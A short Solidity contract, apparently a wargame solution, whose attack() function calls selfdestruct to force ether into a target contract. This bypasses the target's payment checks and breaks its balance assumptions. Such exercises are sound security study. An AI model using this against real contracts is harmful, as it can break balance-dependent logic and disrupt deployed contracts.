// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SelfDestructAttack {
    address forceContractAddress;

    constructor(address payable _address) {
        forceContractAddress = _address;
    }

    // The selfdestruct opcode has been deprecated in Solidity version 0.8.18, as recommended by EIP-6049
    function attack() external {
        selfdestruct(payable(forceContractAddress));
    }
}